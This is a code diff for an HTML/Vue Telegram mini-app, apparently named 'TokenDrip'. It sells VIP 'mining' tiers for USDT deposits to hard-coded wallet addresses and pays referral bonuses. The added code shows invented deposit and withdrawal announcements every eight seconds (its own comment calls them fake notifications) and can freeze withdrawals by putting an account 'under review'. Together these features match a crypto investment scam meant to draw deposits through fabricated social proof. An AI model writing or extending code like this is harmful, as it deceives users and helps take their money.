@@ -16,7 +16,6 @@
         :root { --bg-color: #0f0f0f; --card-bg: #1c1c1c; --primary: #00E676; --text-color: #ffffff; --danger: #FF5252; --warning: #FFC107; }
         body { background-color: var(--bg-color); color: var(--text-color); font-family: 'Cairo', sans-serif; margin: 0; padding-bottom: 90px; user-select: none; -webkit-tap-highlight-color: transparent; }
         
-        /* أزرار اللغة والدعم في الأعلى */
         .top-bar { display: flex; justify-content: space-between; align-items: center; padding: 15px 20px; }
         .icon-btn { background: rgba(255,255,255,0.1); width: 36px; height: 36px; border-radius: 50%; display: flex; align-items: center; justify-content: center; cursor: pointer; font-size: 1.1rem; }
 
@@ -43,28 +42,35 @@
 
         .card { background: var(--card-bg); border-radius: 16px; padding: 16px; margin: 15px; border: 1px solid rgba(255,255,255,0.05); }
         .btn-main { background: linear-gradient(90deg, var(--primary), #00C853); border: none; color: black; font-weight: bold; width: 100%; border-radius: 8px; height: 44px; margin-top: 10px; }
-        .van-tabbar { background-color: #161616; border-top: 1px solid #333; }
+        .btn-main:disabled { background: #444; color: #888; cursor: not-allowed; }
         
+        .van-tabbar { background-color: #161616; border-top: 1px solid #333; }
         .vip-scroll-container { display: flex; gap: 15px; overflow-x: auto; padding: 10px 15px; scrollbar-width: none; }
         .vip-card { min-width: 260px; background: linear-gradient(145deg, #252525, #1a1a1a); border-radius: 16px; padding: 20px; border: 1px solid #333; }
         .vip-card.active-plan { border-color: var(--primary); box-shadow: 0 0 15px rgba(0,230,118,0.15); }
-
         .task-row { display: flex; justify-content: space-between; align-items: center; background: #252525; padding: 15px; border-radius: 12px; margin-bottom: 10px; border: 1px solid #333; }
-        
-        /* تنسيق النوافذ المنبثقة */
         .van-popup { background: var(--card-bg) !important; color: white !important; }
         .van-field__label { color: #aaa !important; } .van-field__control { color: white !important; } .van-cell { background: transparent !important; }
         .van-dialog { background: #222 !important; color: white !important; }
         .van-dialog__confirm { color: var(--primary) !important; }
+        .log-item { display: flex; justify-content: space-between; border-bottom: 1px solid #333; padding: 12px 0; font-size: 0.9rem; }
+        .status-badge { padding: 3px 8px; border-radius: 4px; font-size: 0.75rem; font-weight: bold; }
+        .status-pending { background: rgba(255, 193, 7, 0.2); color: #FFC107; }
+        .status-completed { background: rgba(0, 230, 118, 0.2); color: #00E676; }
+        .status-rejected { background: rgba(255, 82, 82, 0.2); color: #FF5252; }
     </style>
 </head>
 <body>
     <div id="app" v-cloak>
         <div v-if="loading" style="height: 100vh; display: flex; align-items: center; justify-content: center;">
-             <van-loading color="#00E676" vertical>Loading...</van-loading>
+             <van-loading color="#00E676" vertical>Connecting...</van-loading>
         </div>
 
         <div v-else>
+            <van-notice-bar v-if="user.status === 'review'" left-icon="info-o" background="#FFFBE8" color="#ED6A0C" wrapable scrollable text="⚠️ Your account is currently under review. Withdrawals are paused."></van-notice-bar>
+            
+            <van-notice-bar v-if="fakeNotice" left-icon="volume-o" background="#111" color="#00E676" scrollable :text="fakeNotice" style="margin-bottom: 5px;"></van-notice-bar>
+
             <div class="top-bar">
                 <div class="icon-btn" @click="toggleLang">{{ lang === 'ar' ? 'EN' : 'عربي' }}</div>
                 <div class="icon-btn" @click="showSupport = true"><i class="ri-customer-service-2-fill"></i></div>
@@ -110,7 +116,7 @@
                         </div>
                         <div style="margin: 15px 0; font-size: 0.9rem; color: #ccc;">
                             <div>{{ t[lang].daily }}: <span style="color:white; font-weight:bold;">${{ (plan.mineRate * plan.dailyLimit).toFixed(2) }}</span></div>
-                            <div style="margin-top:5px; color:#888;">{{ t[lang].tasks }}: {{ plan.dailyLimit }}</div>
+                            <div style="margin-top:5px; color:#FFC107;">Ref Bonus: {{ (plan.refBonus * 100).toFixed(0) }}%</div>
                         </div>
                         <button v-if="user.vip >= Number(level)" disabled style="width:100%; padding:10px; background:#333; color:#888; border:none; border-radius:8px;">{{ t[lang].active }}</button>
                         <button v-else class="btn-main" @click="buyVip(Number(level))">{{ t[lang].upgrade }}</button>
@@ -149,19 +155,44 @@
                                         <van-radio name="TRC20" checked-color="#00E676">TRC20</van-radio>
                                         <van-radio name="BEP20" checked-color="#00E676">BEP20</van-radio>
                                     </van-radio-group>
-                                    
                                     <van-field v-model="wAddr" :label="t[lang].addr" placeholder="USDT Address"></van-field>
                                     <div v-if="user.savedWallet && !wAddr" @click="wAddr = user.savedWallet" style="font-size:0.75rem; color:var(--primary); padding:0 16px; cursor:pointer;">
                                         {{ t[lang].useSaved }}: {{ user.savedWallet.slice(0,8) }}...
                                     </div>
-
                                     <van-field v-model="wAmt" :label="t[lang].amount" type="number" placeholder="Min 1$"></van-field>
                                     <van-field v-model="wPin" :label="t[lang].pin" type="password" maxlength="4" placeholder="****"></van-field>
-                                    <button class="btn-main" style="margin-top:20px" @click="withdraw">{{ t[lang].reqWithdraw }}</button>
+                                    <button class="btn-main" style="margin-top:20px" @click="withdraw" :disabled="user.status === 'review'">
+                                        {{ user.status === 'review' ? t[lang].underReview : t[lang].reqWithdraw }}
+                                    </button>
                                 </div>
                             </div>
                         </van-tab>
                     </van-tabs>
+                </div>
+
+                <div class="card">
+                    <h3 style="margin-bottom: 10px; border-bottom: 1px solid #333; padding-bottom: 10px;">{{ t[lang].history }}</h3>
+                    <div v-if="!user.transactions || user.transactions.length === 0" style="text-align: center; color: #666; padding: 20px;">
+                        No transactions yet
+                    </div>
+                    <div v-else>
+                        <div v-for="tx in user.transactions" :key="tx.id" class="log-item">
+                            <div>
+                                <div style="font-weight: bold; color: white;">
+                                    {{ tx.type === 'deposit' ? t[lang].deposit : t[lang].withdraw }}
+                                </div>
+                                <div style="font-size: 0.8rem; color: #888;">{{ new Date(tx.date).toLocaleDateString() }}</div>
+                            </div>
+                            <div style="text-align: right;">
+                                <div style="font-weight: bold; margin-bottom: 5px;" :style="{color: tx.type==='deposit' ? '#00E676':'#FFC107'}">
+                                    {{ tx.type === 'deposit' ? '+' : '-' }}${{ tx.amount }}
+                                </div>
+                                <span class="status-badge" :class="'status-'+tx.status">
+                                    {{ tx.status.toUpperCase() }}
+                                </span>
+                            </div>
+                        </div>
+                    </div>
                 </div>
             </div>
 
@@ -175,6 +206,24 @@
                         {{ lang === 'ar' ? 'احصل على مكافأة فورية عند ترقية أصدقائك!' : 'Get instant bonus when friends upgrade!' }}
                     </div>
                     <button class="btn-main" @click="copyLink">{{ t[lang].copyLink }}</button>
+                </div>
+
+                <div class="card">
+                    <h3 style="margin-bottom: 10px; border-bottom: 1px solid #333; padding-bottom: 10px;">{{ t[lang].refHistory }}</h3>
+                    <div v-if="!user.refLogs || user.refLogs.length === 0" style="text-align: center; color: #666; padding: 20px;">
+                        No referrals yet
+                    </div>
+                    <div v-else>
+                        <div v-for="log in user.refLogs" :key="log.date" class="log-item">
+                            <div>
+                                <div style="font-weight: bold; color: white;">{{ log.user }}</div>
+                                <div style="font-size: 0.8rem; color: #888;">{{ new Date(log.date).toLocaleDateString() }}</div>
+                            </div>
+                            <div style="text-align: right;">
+                                <van-tag type="success">{{ log.plan }}</van-tag>
+                            </div>
+                        </div>
+                    </div>
                 </div>
             </div>
 
@@ -194,24 +243,23 @@
 
     <script>
         const { createApp, ref, onMounted, computed } = Vue;
-        // ⚠️ إعدادات السيرفر
+        // ⚠️ تأكد من وضع رابط السيرفر الصحيح هنا
         const CONFIG = { SERVER: "https://steep-resonance-6443.alaabdalaziz01.workers.dev", GROUP_URL: "https://t.me/+bN5dIWAHqJ80ZTM0", BOT_USERNAME: "TokenDrip_bot" };
         const WALLETS = { TRC20: "TEsCEHSkKwWTLLdEuGCHnpf23e8Sv3cZto", BEP20: "0x88bea8db94f9428f282b2cc375ec68ac67fd9200" };
         
         const vipPlans = { 
-            0:{name:"Free",price:0,dailyLimit:0,mineRate:0,maxDailyWithdraw:0}, 
-            1:{name:"VIP 1",price:5,dailyLimit:1,mineRate:1.25,maxDailyWithdraw:5}, 
-            2:{name:"VIP 2",price:15,dailyLimit:2,mineRate:1.725,maxDailyWithdraw:15}, 
-            3:{name:"VIP 3",price:40,dailyLimit:3,mineRate:2.80,maxDailyWithdraw:40}, 
-            4:{name:"VIP 4",price:100,dailyLimit:4,mineRate:4.75,maxDailyWithdraw:100}, 
-            5:{name:"VIP 5",price:300,dailyLimit:5,mineRate:10.20,maxDailyWithdraw:300}, 
-            6:{name:"VIP 6",price:800,dailyLimit:6,mineRate:20.00,maxDailyWithdraw:800} 
+            0:{name:"Free",price:0,dailyLimit:0,mineRate:0,maxDailyWithdraw:0, refBonus:0}, 
+            1:{name:"VIP 1",price:5,dailyLimit:1,mineRate:1.25,maxDailyWithdraw:5, refBonus:0.10}, 
+            2:{name:"VIP 2",price:15,dailyLimit:2,mineRate:1.725,maxDailyWithdraw:15, refBonus:0.08}, 
+            3:{name:"VIP 3",price:40,dailyLimit:3,mineRate:2.80,maxDailyWithdraw:40, refBonus:0.07}, 
+            4:{name:"VIP 4",price:100,dailyLimit:4,mineRate:4.75,maxDailyWithdraw:100, refBonus:0.06}, 
+            5:{name:"VIP 5",price:300,dailyLimit:5,mineRate:10.20,maxDailyWithdraw:300, refBonus:0.05}, 
+            6:{name:"VIP 6",price:800,dailyLimit:6,mineRate:20.00,maxDailyWithdraw:800, refBonus:0.04} 
         };
 
-        // 🌐 الترجمة
         const t = {
-            ar: { balance: "الرصيد الكلي", startTask: "بدء المهمة", clickEarn: "اضغط للربح", wait: "انتظر التحديث", joinGroup: "انضم للمجتمع", bonus: "مكافأة", go: "نفذ", daily: "ربح يومي", tasks: "مهام", active: "مشترك", upgrade: "تفعيل", deposit: "إيداع", withdraw: "سحب", network: "الشبكة", copy: "نسخ", amount: "المبلغ", confirm: "تأكيد", setPinMsg: "يجب تعيين كلمة مرور للسحب", savePin: "حفظ الرمز", addr: "العنوان", useSaved: "استخدام المحفوظ", reqWithdraw: "طلب سحب", pin: "كلمة المرور", community: "المجتمع", refs: "أصدقاء", rank: "رتبة", copyLink: "نسخ الرابط", support: "الدعم الفني", writeMsg: "اكتب مشكلتك...", send: "إرسال", home: "الرئيسية", wallet: "المحفظة", team: "الفريق", taskDone: "تمت المهمة بنجاح! 🎉" },
-            en: { balance: "Total Balance", startTask: "Start Task", clickEarn: "Click to Earn", wait: "Wait Reset", joinGroup: "Join Community", bonus: "Bonus", go: "Go", daily: "Daily", tasks: "Tasks", active: "Active", upgrade: "Activate", deposit: "Deposit", withdraw: "Withdraw", network: "Network", copy: "Copy", amount: "Amount", confirm: "Confirm", setPinMsg: "Set Withdrawal PIN", savePin: "Save PIN", addr: "Address", useSaved: "Use Saved", reqWithdraw: "Request Withdraw", pin: "PIN Code", community: "Community", refs: "Friends", rank: "Rank", copyLink: "Copy Link", support: "Support", writeMsg: "Describe issue...", send: "Send", home: "Home", wallet: "Wallet", team: "Team", taskDone: "Task Completed Successfully! 🎉" }
+            ar: { refHistory: "سجل الإحالات", history: "سجل العمليات", balance: "الرصيد الكلي", startTask: "بدء المهمة", clickEarn: "اضغط للربح", wait: "انتظر التحديث", joinGroup: "انضم للمجتمع", bonus: "مكافأة", go: "نفذ", daily: "ربح يومي", tasks: "مهام", active: "مشترك", upgrade: "تفعيل", deposit: "إيداع", withdraw: "سحب", network: "الشبكة", copy: "نسخ", amount: "المبلغ", confirm: "تأكيد", cancel: "إلغاء", setPinMsg: "يجب تعيين كلمة مرور للسحب", savePin: "حفظ الرمز", addr: "العنوان", useSaved: "استخدام المحفوظ", reqWithdraw: "طلب سحب", underReview: "قيد المراجعة", pin: "كلمة المرور", community: "المجتمع", refs: "أصدقاء", rank: "رتبة", copyLink: "نسخ الرابط", support: "الدعم الفني", writeMsg: "اكتب مشكلتك...", send: "إرسال", home: "الرئيسية", wallet: "المحفظة", team: "الفريق", taskDone: "تمت المهمة بنجاح! 🎉" },
+            en: { refHistory: "Referral History", history: "Transaction History", balance: "Total Balance", startTask: "Start Task", clickEarn: "Click to Earn", wait: "Wait Reset", joinGroup: "Join Community", bonus: "Bonus", go: "Go", daily: "Daily", tasks: "Tasks", active: "Active", upgrade: "Activate", deposit: "Deposit", withdraw: "Withdraw", network: "Network", copy: "Copy", amount: "Amount", confirm: "Confirm", cancel: "Cancel", setPinMsg: "Set Withdrawal PIN", savePin: "Save PIN", addr: "Address", useSaved: "Use Saved", reqWithdraw: "Request Withdraw", underReview: "Under Review", pin: "PIN Code", community: "Community", refs: "Friends", rank: "Rank", copyLink: "Copy Link", support: "Support", writeMsg: "Describe issue...", send: "Send", home: "Home", wallet: "Wallet", team: "Team", taskDone: "Task Completed Successfully! 🎉" }
         };
 
         createApp({
@@ -219,7 +267,7 @@
                 const lang = ref('ar');
                 const toggleLang = () => lang.value = lang.value === 'ar' ? 'en' : 'ar';
                 
-                const user = ref({ balance: 0, vip: 0, referrals: 0, mineCount: 0, savedWallet: null, groupJoined: false });
+                const user = ref({ balance: 0, vip: 0, referrals: 0, mineCount: 0, savedWallet: null, groupJoined: false, transactions: [], refLogs: [], status: 'active' });
                 const loading = ref(true);
                 const activeTab = ref('home'); const walletTab = ref(0);
                 const depAmount = ref(''); const depTxid = ref(''); const wAmt = ref(''); const wAddr = ref(''); const wPin = ref(''); const newPin = ref(''); const depositNetwork = ref('BEP20');
@@ -227,6 +275,18 @@
                 const showSupport = ref(false); const supportMsg = ref('');
                 const isProcessing = ref(false);
                 const timeLeft = ref('');
+                
+                // ✅ منطق الإشعارات الوهمية
+                const fakeNotice = ref('');
+                const generateFakeNotice = () => {
+                    const amt = Math.floor(Math.random() * (30 - 5 + 1)) + 5;
+                    const isAr = lang.value === 'ar';
+                    const msgs = isAr ?
+                        [`🔔 مستخدم قام بإيداع $${amt}`, `🔔 مستخدم قام بسحب $${amt}`, `🔔 عملية سحب ناجحة بقيمة $${amt}`, `🔔 إيداع جديد بقيمة $${amt}`] :
+                        [`🔔 User deposited $${amt}`, `🔔 User withdrew $${amt}`, `🔔 Successful withdrawal of $${amt}`, `🔔 New deposit of $${amt}`];
+                    fakeNotice.value = msgs[Math.floor(Math.random() * msgs.length)];
+                };
+
                 let timerInterval = null;
                 const tg = window.Telegram.WebApp; tg.expand();
 
@@ -287,6 +347,9 @@
                 
                 const withdraw = async () => {
                     if (!wAddr.value) return vant.showToast('Enter Address');
+                    // ✅ منع السحب إذا كان أقل من 1$ في الواجهة
+                    if (Number(wAmt.value) < 1) return vant.showNotify({ type: 'warning', message: 'Min withdraw 1$' });
+                    
                     const data = await api("withdraw", { amount: wAmt.value, wallet: wAddr.value, pin: wPin.value, network: depositNetwork.value });
                     if (data.ok) { user.value = data.user; vant.showSuccessToast('Request Sent'); wAmt.value=''; wPin.value=''; } 
                     else { vant.showNotify({ type: 'danger', message: data.error }); }
@@ -303,7 +366,12 @@
                 const buyVip = (lvl) => {
                     const plan = vipPlans[lvl];
                     const msg = lang.value === 'ar' ? `شراء ${plan.name} بسعر ${plan.price}$؟` : `Buy ${plan.name} for $${plan.price}?`;
-                    vant.showConfirmDialog({ title: 'Upgrade', message: msg }).then(async () => {
+                    vant.showConfirmDialog({ 
+                        title: 'Upgrade', 
+                        message: msg,
+                        confirmButtonText: t[lang.value].confirm,
+                        cancelButtonText: t[lang.value].cancel
+                    }).then(async () => {
                         const d = await api("buy_vip", { tier: lvl });
                         if(d.ok) { user.value = d.user; vant.showSuccessToast('Upgraded!'); } else vant.showFailToast(d.error);
                     }).catch(() => {});
@@ -313,8 +381,14 @@
                 const copyLink = () => { navigator.clipboard.writeText(`https://t.me/${CONFIG.BOT_USERNAME}?startapp=${user.value.id}`); vant.showToast(t[lang.value].copy); };
                 const formatMoney = (v) => Number(v).toFixed(2);
 
-                onMounted(refresh);
-                return { loading, activeTab, walletTab, user, vipPlans, depAmount, depTxid, wAmt, wAddr, wPin, newPin, depositNetwork, isProcessing, timeLeft, isMiningDisabled, handleCollect, setupPin, withdraw, submitDeposit, buyVip, copyAddress, copyLink, formatMoney, joinGroupTask, CONFIG, WALLETS, lang, t, toggleLang, showSupport, supportMsg, sendSupport };
+                onMounted(() => {
+                    refresh();
+                    // تشغيل الإشعارات الوهمية
+                    generateFakeNotice();
+                    setInterval(generateFakeNotice, 8000);
+                });
+
+                return { loading, activeTab, walletTab, user, vipPlans, depAmount, depTxid, wAmt, wAddr, wPin, newPin, depositNetwork, isProcessing, timeLeft, isMiningDisabled, handleCollect, setupPin, withdraw, submitDeposit, buyVip, copyAddress, copyLink, formatMoney, joinGroupTask, CONFIG, WALLETS, lang, t, toggleLang, showSupport, supportMsg, sendSupport, fakeNotice };
             }
         }).use(vant).mount("#app");
     </script>
